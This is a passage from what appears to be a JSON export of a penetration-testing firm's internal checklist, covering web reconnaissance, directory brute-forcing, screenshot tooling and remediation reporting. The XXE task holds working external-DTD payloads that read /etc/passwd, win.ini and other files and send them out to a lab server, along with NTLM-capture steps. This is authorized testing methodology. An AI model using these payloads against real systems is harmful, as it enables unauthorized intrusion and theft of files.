Ports</li>\n<li>Exposures: Certs</li>\n</ul>\n<h3>Export Instructions</h3>\n<b>Assets: IPs</b>\n<ol><li>In the search bar, enter 'live:true AND monitored:true' and hit enter to filter by live assets</li>\n<li>Check the box next to the ID column</li>\n<li>Click the Bulk Options drop down list</li>\n<li>Select Export CSV</li>\n</ol>\n<b>Assets: Domains</b>\n<ol><li>Click the 3 bars button to the right of the search bar to change to table view</li>\n<li>In the search bar, enter 'live:true AND monitored:true' and hit enter to filter by live assets</li>\n<li>Check the box next to the ID column</li>\n<li>Click the Bulk Options drop down list</li>\n<li>Select Export CSV</li>\n</ol>\n<b>Exposures: DNS</b>\n<ol><li>Check the box next to the ID column</li>\n<li>Click the Bulk Options drop down list</li>\n<li>Select Export CSV</li>\n</ol>\n<b>Exposures: Ports</b>\n<ol><li>Check the box next to the ID column</li>\n<li>Click the Bulk Options drop down list</li>\n<li>Select Export CSV</li>\n</ol>\n<b>Exposures: Certs</b>\n<ol><li>Check the box next to the ID column</li>\n<li>Click the Bulk Options drop down list</li>\n<li>Select Export CSV</li>\n</ol>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 11,
                "id": 350468,
                "name": "Vulnerability Enumeration: Web Applications",
                "description": "This category includes web application attack tasks that apply to the internet network penetration test process.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "[OPTIONAL] Leverage Self Registration for Additional Access",
                        "state": 3,
                        "comments": 0,
                        "uid": "c429c10e-2af0-11ee-9236-2f32e8ff8d88",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nReview vulnerability scan results and web scraping results for potential targets.\n\nOnly do this as time allows.\n\nDO NOT target self-registration that require credit cards or social security numbers.\n\nReview application screenshots for self-registration pages. \n\nAttempt to register and identify application vulnerabilities once logged into.\n\nFocus on lowing hanging fruit issues.\n\n<h2><b>Reporting Requirements</b></h2>\nAdd relevant findings and step by step attack walk through.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Identify Login Pages",
                        "state": 2,
                        "comments": 1,
                        "uid": "c429b0ce-2af0-11ee-9235-bb1618bfdabc",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview domains and web scraping results for login pages.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Directory Bruteforce",
                        "state": 2,
                        "comments": 2,
                        "uid": "c429de8c-2af0-11ee-9237-c7fd8aab64ad",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform directory bruteforcing to identify administrative portals or sensitive information.\n\n<h2>Variation: ffuf</h2>\n<ncode>https://github.com/ffuf/ffuf\n</ncode>\n1. Install ffuf via go.\n<ncode>go install -v github.com/ffuf/ffuf@latest\n</ncode>\n2. Run ffuf.\n<ncode>ffuf -u https://netspi.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt --recursion\n</ncode>\n<h2>Variation: gobuster</h2>\n<ncode>https://github.com/OJ/gobuster\n</ncode>\n1. Install gobuster via go.\n<ncode>go install github.com/OJ/gobuster/v3@latest\n</ncode>\n2. Run gobuster.\n<ncode>gobuster dir -t 50 -u https://nettspi.com/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o dirbrute.txt\n</ncode>\n<h2>Variation: auto-gobuster</h2>\n<ncode>https://github.com/NetSPI/Scripts-Private/tree/master/auto-gobuster\n</ncode>\n1. Clone the repository.\n<ncode>git clone https://github.com/NetSPI/Scripts-Private.git\n</ncode>\n2. Download the gobuster binary and place it in the <ncode>auto-gobuster</ncode> directory.\n<ncode>https://github.com/OJ/gobuster\n</ncode>\n3. Follow the usage instructions in the README.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Identify Site Potential vulnerable to XXE",
                        "state": 3,
                        "comments": 0,
                        "uid": "c429558e-2af0-11ee-9234-07e672e38a49",
                        "ordinal": 4,
                        "masterFindingId": 5050649,
                        "taskInstructions": "<h2>Instructions</h2>\nReview websites that support JSON or XML content-types. For JSON, attempt XML injections by changing JSON content-type to XML and follow the instructions in the blog below.\n<b>Reference:</b> https://blog.netspi.com/playing-content-type-xxe-json-endpoints/\n\nAttempt to inject DOCTYPE definitions to XML-based requests (SOAP or RESTful). DOCTYPE must be defined before the XML body.\nReference to external entity: &amp;entity;\nXXE can also be found in XML formatted GET and POST parameters and the same instructions can be followed to identify XXE. XXE is quite common in SAML tokens.\n<h3>Sample:</h3>\n<ncode>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY\ntest SYSTEM &quot;http://www.test.com/test.txt&quot;&gt;&lt;!ELEMENT foo ANY&gt;]&gt;\n&lt;xml start&gt;\n..\n&lt;foo&gt;&amp;test;&lt;/foo&gt;\n..\n&lt;xml ends&gt;\n</ncode>\nIt is not necessary to define the element, external entity references can be used within existing elements.\nIf injection possible, attempt to\n<ul><li>Read local files (entity reference file:///etc/passwd or c:\\windows\\win.ini)</li>\n<li>Attempt to connect back to the pentest lab environment and capture possible NTLM handshake with responder (entity reference http://&lt;pentestExternalIP&gt;/test or \\\\&lt;pentestExternalIP&gt;\\test on Windows systems)</li>\n</ul>\nIf outbound connectivity, external DTD can be hosted at the pentest lab.\n<h3>Sample entity injection:</h3>\n<ncode>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;\n&lt;!DOCTYPE foo SYSTEM &quot;http://&lt;pentestExternalIP&gt;/test.dtd&quot;&gt;]&gt;\nHosted test.dtd file content:\n&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;\n&lt;!ENTITY % param1 '&lt;!ENTITY &amp;&#35;37; external SYSTEM\n&quot;http://&lt;pentestExternalIP&gt;/x=&#35;%payload;&quot;&gt;'&gt; %param1; %external;\n</ncode>\nInvalid URL (x=&#35;) is used to force error messages on SAX parser. It may not be necessary. Instead, file contents may be available on .216 in Apache access logs. % is used to create parameter entities; they are used inside DOCTYPE definition rather than the XML body.\n\nEntity injection has limited file read capabilities. XML tags and ampersands in files to be read break XML parsing and thus cannot typically be read. It may be possible to read XML files if a) outbound connectivity and b) reflection point for file read is found. I have no instructions at the moment... experiment.\n<h2><b>Reporting Requirements</b></h2>\n<ol><li>Add a screenshot of the original request</li>\n<li>Show the XXE injected to the request</li>\n<li>Show file content enumeration or external connection to pentest lab system</li>\n</ol>\n<h2><b>Further Testing</b></h2>\nTest for additional findings that can be identified via XXE injection:\n<ul><li>Insufficient Egress Filtering - report if HTTP or SMB connectivity to pentest lab servers (or Collaborator)</li>\n<li>Cleartext passwords in files - report if file include used to gain access to cleartext credentials</li>\n<li>Excessive Privileges - Service Account - report on Windows if possible to connect to \\\\localhost\\c$\\windows\\win.ini</li>\n</ul>\n<h2><b>Additional Instructions</b></h2>\n<h3><b>ERROR Based Injection using DTD</b></h3>\n<b><i>Verification Summary</i></b>\n1. Add firewall exception for the client's IPs.\n\n2. Inject external DTD reference that points to pentest lab servers/files.\n\n3. Sniff incoming traffic and parse Apache logs.\n\n<b><i>Firewall Exception Details</i></b>\nThe first thing you'll need to do is add an exception on the data exfiltration firewall for the client outbound IPs.  To do that follow the basic instructions below.\n1. Log into the pentest firewall location\n\n2. Start monitoring traffic to look for incoming traffic.\n<ncode>Diagnostics -&gt; Packet Capture\n</ncode>\n3. Initiate the XML injection.\n\n4. Stop and review the IPs from the capture, identify the client IP, and add the IP addresses to the pentest alias.\n<ncode>Firewall -&gt; Aliases -&gt; Edit -&gt; + button -&gt; Add IP and Comment -&gt;Press Save -&gt; Press Apply Changes\n</ncode>\n<h3><b>Inject External DTD Reference</b></h3>\n<b><i>Below is an example request</i></b>\n<ncode>POST /test HTTP/1.1\nHost: someserver.test.com\nAccept: application/json\nContent-Type: application/xml\nContent-Length: 137\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/stest.dtd&quot;&gt;\n&lt;root&gt;\n&lt;search&gt;name&lt;/search&gt;\n&lt;/root&gt;\n</ncode>\n<b><i>Expected result example:</i></b>\n<ncode>HTTP/1.1 500 Internal Server Error\nContent-Type: application/xml\nContent-Length: 2467\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;\n&lt;errors&gt;\n&lt;errorMessage&gt;java.io.FileNotFoundException: file:///nothere/root:x:0:0:root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync...\n</ncode>\n<b><i>Below are different files that are currently on the netspi web server.</i></b>\n<ncode>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi.dtd&quot;&gt;\ncontent:\n&lt;!ENTITY % payload SYSTEM &quot;file:///var/log/messages&quot;&gt;\n&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;&quot;&gt;%param1;%external;\n&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi2.dtd&quot;&gt;\ncontent:\n&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;\n&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://%payload;:aaa@209.118.108.216:443'&gt;&quot;&gt;%param1;%external;\n&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi3.dtd&quot;&gt;\ncontent:\n&lt;!ENTITY % b SYSTEM &quot;file:///etc/passwd&quot;&gt;\n&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;&#35;37; rrr SYSTEM 'ftp://209.118.108.216:443/%b;'&gt;&quot;&gt;\n&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi4.dtd&quot;&gt;\ncontent:\n&lt;!DOCTYPE drawing SYSTEM &quot;http://209.118.108.216/netspi.dtd&quot;&gt;\n&lt;!ENTITY payload &quot;file://c:\\windows\\win.ini&quot;&gt;\n&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi5.dtd&quot;&gt;\ncontent:\n&lt;!ENTITY % payload SYSTEM &quot;file:///etc/fstab&quot;&gt;\n&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;&quot;&gt;%param1;%external;\n&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi6.dtd&quot;&gt;\ncontent:\n&lt;!ENTITY % payload SYSTEM &quot;file:///Program Files/Business Objects/manifest.db&quot;&gt;\n&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://209.118.108.216:443/%payload;'&gt;&quot;&gt;%param1;%external;\n&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi7.dtd&quot;&gt;\ncontent:\n&lt;!ENTITY % payload SYSTEM &quot;file:///Documents and Settings/&quot;&gt;\n&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;\n&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'file:///test/%payload;'&gt;&quot;&gt;%param1;%external;\nCDATA:\n</ncode>\nInjection (With inflection point):\n<ncode>&lt;!DOCTYPE updateProfile [\n&lt;!ENTITY % file SYSTEM &quot;file:///test&quot;&gt;\n&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;\n&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;\n&lt;!ENTITY % dtd SYSTEM &quot;http://209.118.108.216/cdata.dtd&quot;&gt;\n%dtd;\n]&gt;\n</ncode>\nOn NetSPI server:\n<ncode>&lt;!ENTITY all &quot;%start;%file;%end;&quot;&gt;\n</ncode>\n<h3><b>Monitoring incoming traffic</b></h3>\n1. Login into 10.2.4.11 via ssh as root or login via the vsphere client.\n2. Montor incoming request via the Apache log with the command below.\n<ncode>tail -f /var/log/apache2/httpd-access.log\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Target List",
                        "state": 2,
                        "comments": 1,
                        "uid": "c429fc32-2af0-11ee-9238-c32b77384cf2",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nBuild a list of in-scope domains, subdomains, and URLs from enumeration phases to target. These targets should also be used for Burp scanning.\n\n<h3>Example</h3>\nBuild a target list from the following sources:\n\n<ul><li>ASM - Export live domains, DNS Records</li>\n<li>Subdomain Enumeration - amass, GetAllURLs, Certificate Transparency Logs, Rapid7 OpenData</li>\n<li>ADS Domain Enumeration</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Web Scraping",
                        "state": 2,
                        "comments": 1,
                        "uid": "c42a17e4-2af0-11ee-9239-d700bf9d3303",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform screenshot and header capture from all in scope web applications.\n\nRun one of the screenscaping tools below, zip up the information, and attach it to the project documents.\n\nWeb scraping should target all web servers (can be found in the &quot;HTTP - Service Uses Protocol&quot; finding) by IP and all in scope domain names identified during the reconnaissance phases.\n\nFor the domains, target 80 (HTTP) and 443 (HTTPS). DO NOT target ISP domains. They will not yield additional results. For both IP addresses and domains, target HTTP and HTTPS. \n\n<h2><b>Variation: Eyewitness</b></h2>\n1. Download eyewitness from https://github.com/FortyNorthSecurity/EyeWitness\n<ncode>git clone https://github.com/FortyNorthSecurity/EyeWitness.git\n</ncode>\n2. Run the setup.sh file\n<ncode>cd EyeWitness\ncd setup\n./setup.sh\n</ncode>\n3. Run the script\n<ncode>./EyeWitness -x nmapfulltcp.xml --web\n</ncode>\nor\n<ncode>./EyeWitness -f urls.txt --web\n</ncode>\n<h2>Variation: gowitness</h2>\n1. Install gowitness via go.\n<ncode>go install github.com/sensepost/gowitness@latest\n</ncode>\n2. Run gowitness with a list of URLs or from and nmap scan file.\n<ncode>gowitness file -f urls.txt -D sqldb_path -P screenshot_path\n</ncode>\nOR\n<ncode>gowitness nmap -f nmap.xml --open --service-contains http -D sqldb_path -P screenshot_path\n</ncode>\n3. Generate the report.\n<ncode>gowitness report export -f webscrape.zip -D sqldb_path -P screenshot_path\n</ncode>\n\n<b>Below are some additional options:</b>\n<ul><li>https://github.com/michenriksen/aquatone</li>\n<li>https://github.com/byt3bl33d3r/WitnessMe</li>\n<li>https://github.com/Sw4mpf0x/Kraken</li>\n<li>https://github.com/moloch--/electric-scan</li>\n<li>https://github.com/sensepost/gowitness</li>\n<li>https://github.com/FortyNorthSecurity/EyeWitness</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 20,
                "id": 350469,
                "name": "Remediation Test Tasks",
                "description": "Tasks for conducting a remediation test.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Resolve: Generate Remediation report",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42a68b6-2af0-11ee-923b-7b3dda012164",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "Use Resolve to generate a remediation report for the project. Make sure to use the correct &quot;Remediation&quot; template for your project type. Mark this task complete once the report is generated.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Conduct remediation testing on in-scope findings",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42ab01e-2af0-11ee-9240-4be3df3dae8a",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "Retest each finding for all instances using the same steps as the original verifications.\n\n1. If the finding is remediated, mark it <b>Remediated</b>.\n2. If the finding is still reproduced using the same steps, mark it <b>Not Remediated</b>.\n3. If the finding instance is reproduced using different steps than the original verifications, mark it <b>Not Remediated </b>add a new verification using the below as a template:\n\nRemediation Test Observation MM/DD/YYYY - NetSPI conducted a remediation test on this finding and observed it is not remediated. New verification steps have been provided to highlight deviations from the original verifications steps that are required to reproduce the vulnerability. \n<ncode>&lt;verification stuff&gt;\n</ncode>\n4. If the system or service is offline at the time of remediation testing, mark it <b>Remediated </b>add a new verification using the below as a template:\n\nRemediation Test Observation MM/DD/YYYY - NetSPI observed this service was offline at the time of remediation testing and has noted this finding as Remediated.\n<ncode>&lt;nmap showing the service is offline&gt;\n</ncode>\n5. If the original finding is identified to be false positive, mark it <b>Remediated </b>and add an additional verification using the below as a template:\n\nRemediation Test Observation MM/DD/YYYY - Through further testing, this finding was deemed false positive. &lt;description of further testing or false positive if applicable&gt;\n<ncode>&lt;verification stuff if applicable&gt;\n</ncode>\n\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Manually change Not Retested",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42a78b0-2af0-11ee-923c-e72148a8dbc2",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "You will have to manually enter &quot;Not Retested&quot; in the report for findings that were not included in the remediation test.\n\nThis will need to be changed in 2 places:\n1. In the &quot;<b>Remediation Status</b>&quot; column of the Summary of Findings table.\n2. In each applicable finding header indicating the status [Not Retested]\n\nMark this task complete once the report is updated.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Manually sync original and remediation reports",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42a90de-2af0-11ee-923e-1760c5416fdf",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": "There are several items that need to be carried over from the original report to the remediation report that was generated.\n1. <b>Chapter 1.2 Executive Summary - Summary of Results</b>\n2. <b>Chapter 1.3 Executive Summary - Summary of Recommendations</b>\n3. <b>Chapter 2.1 Project Overview - Scope</b>\n4. <b>Chapter 2.2 Project Overview - Constraints</b>\n5. <b>Chapter 4 Penetration Test Attack Narrative </b>(if applicable). If no narrative, delete this section from the Remediation report.\n6. <b>Appendix A - NetSPI Contact Information</b>\n7. <b>Appendix B - Systems in Scope</b>\n8. <b>Revision History</b> - Copy the original revision history table information into the Remediation report, then add 1 line for version 2.0 with your name, the date, and the description/comment &quot;Remediation Report&quot;\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Sharepoint: Download original report",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42a4ac0-2af0-11ee-923a-63604e16cd09",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "Pull the original report using the Sharepoint link in the project summary page. Mark this task complete once downloaded.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Cleanup and finalize Remediation report",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42a9fd4-2af0-11ee-923f-cbd869cb43b9",
                        "ordinal": 6,
                        "masterFindingId": null,
                        "taskInstructions": "Perform typical cleanup of the report to finalize such as checking dates, Ctrl+F for &quot;References&quot; and make sure there are no extra line feeds, make sure all findings have a remediation category, etc.\n\nUpload to Sharepoint and let the PM know when the Remediation report is ready for delivery.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Check scope of remediation testing",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42a8bc0-2af0-11ee-923d-c39946cf6150",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "Read the project description to confirm what findings are in scope for remediation testing. For ExPen, this should typically be medium and higher severity findings.\n\nFor all findings that do not fall in-scope of remediation testing, mark them as &quot;Not Retested&quot;. Note that you will have to manually change this in the report later on as well.\n\nEscalate to your manager or service line lead (Ryan Krause, Nick Croy) if the scope is larger and seems like too much for the time provided.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            }
        ],
        "totalTasks": 191,
        "naTasks": 78,
        "completedTasks": 85,
        "status": 2,
        "checklistStatusList": [
            {
                "name": "New",
                "id": 0
            },
            {
                "name": "In Progress",
                "id": 1
            },
            {
                "name": "Complete",
                "id": 2
            }
        ],
        "templates": [
            "d1b25c97-ddc1-4dd8-8552-128b25dbdf1a"
        ]
    }
}